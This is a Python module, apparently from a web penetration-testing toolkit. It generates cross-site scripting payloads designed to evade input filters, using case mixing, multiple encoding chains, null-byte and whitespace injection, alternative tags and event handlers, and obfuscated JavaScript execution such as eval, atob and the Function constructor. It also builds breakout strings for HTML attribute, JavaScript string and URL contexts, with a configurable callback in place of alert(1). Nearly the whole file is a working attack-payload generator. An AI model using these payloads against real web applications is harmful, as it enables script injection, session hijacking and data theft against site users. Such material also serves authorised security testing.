"""
Filter evasion techniques for XSS.

Bypasses common filters using:
- Case variations
- Encoding chains (URL, HTML, Unicode, Hex)
- Null bytes and whitespace injection
- String concatenation
- Recursive filter bypass
- Comment injection
"""

import html
import urllib.parse
from dataclasses import dataclass, field
from typing import Iterator


@dataclass
class FilterEvasion:
    """Generate filter-evading XSS payloads."""

    # Characters that might be filtered
    blocked_chars: set[str] = field(default_factory=set)
    blocked_strings: set[str] = field(default_factory=set)

    def evade_all(self, payload: str) -> list[str]:
        """Generate all evasion variants of a payload."""
        variants = [payload]

        # Case variations
        variants.extend(self.case_variations(payload))

        # Encoding variations
        variants.extend(self.encoding_variations(payload))

        # Whitespace/null injection
        variants.extend(self.whitespace_injection(payload))

        # Tag variations
        variants.extend(self.tag_variations(payload))

        # Event handler variations
        variants.extend(self.event_variations(payload))

        # String obfuscation for JS
        variants.extend(self.js_obfuscation(payload))

        return list(dict.fromkeys(variants))  # Dedupe

    def case_variations(self, payload: str) -> list[str]:
        """Generate case-mixed variants."""
        variants = []

        # Mixed case for tags
        if "<script" in payload.lower():
            variants.extend([
                payload.replace("<script", "<ScRiPt").replace("</script", "</ScRiPt"),
                payload.replace("<script", "<SCRIPT").replace("</script", "</SCRIPT"),
                payload.replace("<script", "<scRipt").replace("</script", "</scRipt"),
                payload.replace("<script", "<sCrIpT").replace("</script", "</sCrIpT"),
            ])

        if "<img" in payload.lower():
            variants.extend([
                payload.replace("<img", "<IMG"),
                payload.replace("<img", "<iMg"),
                payload.replace("<img", "<ImG"),
            ])

        if "onerror" in payload.lower():
            variants.extend([
                payload.replace("onerror", "ONERROR"),
                payload.replace("onerror", "OnErRoR"),
                payload.replace("onerror", "oNeRrOr"),
            ])

        if "onload" in payload.lower():
            variants.extend([
                payload.replace("onload", "ONLOAD"),
                payload.replace("onload", "OnLoAd"),
            ])

        if "alert" in payload.lower():
            # Can't case-mix JS functions, but can use alternatives
            variants.extend([
                payload.replace("alert(1)", "confirm(1)"),
                payload.replace("alert(1)", "prompt(1)"),
                payload.replace("alert(1)", "print()"),
            ])

        return variants

    def encoding_variations(self, payload: str) -> list[str]:
        """Generate encoding-based variants."""
        variants = []

        # HTML entity encoding
        if "<" in payload:
            variants.append(payload.replace("<", "&#60;"))
            variants.append(payload.replace("<", "&#x3c;"))
            variants.append(payload.replace("<", "&#X3C;"))
            variants.append(payload.replace("<", "&lt"))  # No semicolon
            variants.append(payload.replace("<", "&#0060;"))  # Padded

        if ">" in payload:
            variants.append(payload.replace(">", "&#62;"))
            variants.append(payload.replace(">", "&#x3e;"))

        # Double URL encoding
        url_encoded = urllib.parse.quote(payload)
        double_encoded = urllib.parse.quote(url_encoded)
        variants.append(url_encoded)
        variants.append(double_encoded)

        # Unicode escapes for JS
        if "alert" in payload:
            variants.append(payload.replace("alert", "\\u0061lert"))
            variants.append(payload.replace("alert", "\\u0061\\u006cert"))
            variants.append(payload.replace("alert", "al\\u0065rt"))

        # Hex encoding for JS strings
        if "alert(1)" in payload:
            variants.append(payload.replace("alert(1)", "\\x61lert(1)"))
            variants.append(payload.replace("alert(1)", "eval('\\x61lert(1)')"))

        # Octal encoding
        if "alert" in payload:
            variants.append(payload.replace("alert", "\\141lert"))

        return variants

    def whitespace_injection(self, payload: str) -> list[str]:
        """Inject whitespace and null bytes to bypass filters."""
        variants = []

        # Null byte injection (works in some parsers)
        if "<script" in payload.lower():
            variants.extend([
                payload.replace("<script", "<scr\x00ipt"),
                payload.replace("<script", "<\x00script"),
                payload.replace("</script", "</scr\x00ipt"),
            ])

        # Tab/newline in tag names
        if "<script" in payload.lower():
            variants.extend([
                payload.replace("<script", "<script\t"),
                payload.replace("<script", "<script\n"),
                payload.replace("<script", "<script\r"),
                payload.replace("<script", "<script/"),
                payload.replace("<script", "<script\x0c"),  # Form feed
            ])

        # Space variations in attributes
        if "onerror=" in payload:
            variants.extend([
                payload.replace("onerror=", "onerror ="),
                payload.replace("onerror=", "onerror\t="),
                payload.replace("onerror=", "onerror\n="),
                payload.replace("onerror=", "onerror/="),  # Slash
            ])

        # Newlines in JS
        if "alert(1)" in payload:
            variants.extend([
                payload.replace("alert(1)", "alert\n(1)"),
                payload.replace("alert(1)", "alert\t(1)"),
                payload.replace("alert(1)", "al\\\nert(1)"),
            ])

        return variants

    def tag_variations(self, payload: str) -> list[str]:
        """Generate tag-based variations."""
        variants = []

        # Alternative script tags
        if "<script>" in payload:
            base = payload.replace("<script>alert(1)</script>", "{}")
            alternatives = [
                '<script>alert(1)</script>',
                '<script src="data:,alert(1)">',
                '<script src="data:text/javascript,alert(1)">',
                '<script/src="data:,alert(1)">',
                '<script >alert(1)</script >',
                '<script\t>alert(1)</script>',
                '<script\n>alert(1)</script>',
            ]
            variants.extend([base.format(alt) for alt in alternatives])

        # Alternative event handlers if img/onerror is filtered
        if "<img" in payload and "onerror" in payload:
            base_payloads = [
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<marquee onstart=alert(1)>',
                '<video><source onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
                '<iframe srcdoc="<script>alert(1)</script>">',
                '<object data="javascript:alert(1)">',
                '<embed src="javascript:alert(1)">',
                '<a href="javascript:alert(1)">click</a>',
                '<form action="javascript:alert(1)"><input type=submit>',
            ]
            variants.extend(base_payloads)

        # SVG variants
        if "<svg" in payload:
            variants.extend([
                '<svg/onload=alert(1)>',
                '<svg onload=alert(1)//>',
                '<svg onload=alert`1`>',
                '<svg/onload=alert`1`>',
                '<svg\tonload=alert(1)>',
            ])

        return variants

    def event_variations(self, payload: str) -> list[str]:
        """Generate event handler variations."""
        variants = []

        # If onerror is blocked, try other events
        if "onerror" in payload:
            alternative_events = [
                ("onerror", "onload"),
                ("onerror", "onfocus"),
                ("onerror", "onmouseover"),
                ("onerror", "onclick"),
                ("onerror", "oninput"),
                ("onerror", "onanimationend"),
            ]
            for old, new in alternative_events:
                if old in payload:
                    variants.append(payload.replace(old, new))

        # Event without quotes
        if 'onerror="alert(1)"' in payload:
            variants.extend([
                payload.replace('onerror="alert(1)"', 'onerror=alert(1)'),
                payload.replace('onerror="alert(1)"', "onerror='alert(1)'"),
                payload.replace('onerror="alert(1)"', 'onerror=alert`1`'),
            ])

        # Backtick variations for JS
        if "alert(1)" in payload:
            variants.extend([
                payload.replace("alert(1)", "alert`1`"),
                payload.replace("alert(1)", "alert.call(null,1)"),
                payload.replace("alert(1)", "[].map.call(alert,1)"),
                payload.replace("alert(1)", "Reflect.apply(alert,null,[1])"),
            ])

        return variants

    def js_obfuscation(self, payload: str) -> list[str]:
        """Obfuscate JavaScript code."""
        variants = []

        if "alert(1)" in payload:
            obfuscated = [
                # eval-based
                "eval('ale'+'rt(1)')",
                "eval(atob('YWxlcnQoMSk='))",  # Base64
                "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",

                # Function constructor
                "Function('alert(1)')()",
                "[].constructor.constructor('alert(1)')()",
                "new Function('alert(1)')()",

                # setTimeout/setInterval
                "setTimeout('alert(1)')",
                "setTimeout(alert,0,1)",
                "setInterval('alert(1)',0)",

                # With statement (deprecated but works)
                "with(document)alert(1)",

                # Object methods
                "window['alert'](1)",
                "window['al'+'ert'](1)",
                "self['alert'](1)",
                "top['alert'](1)",
                "parent['alert'](1)",
                "frames['alert'](1)",
                "this['alert'](1)",

                # Proxy/Reflect
                "Reflect.apply(alert,window,[1])",

                # Template strings
                "alert`1`",

                # Location tricks
                "location='javascript:alert(1)'",
                "location.href='javascript:alert(1)'",

                # document.write
                "document.write('<script>alert(1)<\\/script>')",

                # innerHTML
                "document.body.innerHTML='<img src=x onerror=alert(1)>'",
            ]

            for obf in obfuscated:
                variants.append(payload.replace("alert(1)", obf))

        return variants

    def recursive_bypass(self, payload: str, blocked: str) -> list[str]:
        """
        Bypass recursive filters that remove blocked strings.
        e.g., if 'script' is removed: <scrscriptipt> -> <script>
        """
        variants = []

        if blocked in payload.lower():
            # Insert blocked string inside itself
            mid = len(blocked) // 2
            doubled = blocked[:mid] + blocked + blocked[mid:]
            variants.append(payload.replace(blocked, doubled))

            # Multiple levels
            tripled = blocked[:mid] + doubled + blocked[mid:]
            variants.append(payload.replace(blocked, tripled))

        return variants

    def generate_for_context(
        self,
        context: str,
        callback: str = "alert(1)"
    ) -> Iterator[str]:
        """Generate evasion payloads for specific context."""

        if context == "html_body":
            base_payloads = [
                f"<script>{callback}</script>",
                f"<img src=x onerror={callback}>",
                f"<svg onload={callback}>",
            ]

        elif context == "html_attribute_quoted":
            base_payloads = [
                f'"><script>{callback}</script>',
                f'" onmouseover={callback} x="',
                f'" onfocus={callback} autofocus x="',
            ]

        elif context == "html_attribute_single":
            base_payloads = [
                f"'><script>{callback}</script>",
                f"' onmouseover={callback} x='",
            ]

        elif context == "javascript_string":
            base_payloads = [
                f'";{callback}//',
                f'"+{callback}+"',
                f'";</script><script>{callback}</script>',
            ]

        elif context == "javascript_string_single":
            base_payloads = [
                f"';{callback}//",
                f"'+{callback}+'",
                f"';</script><script>{callback}</script>",
            ]

        elif context == "url_href":
            base_payloads = [
                f"javascript:{callback}",
                f"javascript:void({callback})",
                f"data:text/html,<script>{callback}</script>",
            ]

        else:
            base_payloads = [f"<script>{callback}</script>"]

        # Generate evasions for each base payload
        for payload in base_payloads:
            yield payload
            for variant in self.evade_all(payload):
                yield variant


def get_filter_evasion_payloads(
    context: str = "html_body",
    max_payloads: int = 50,
) -> list[str]:
    """Convenience function to get filter evasion payloads."""
    evasion = FilterEvasion()
    payloads = list(evasion.generate_for_context(context))
    return payloads[:max_payloads]
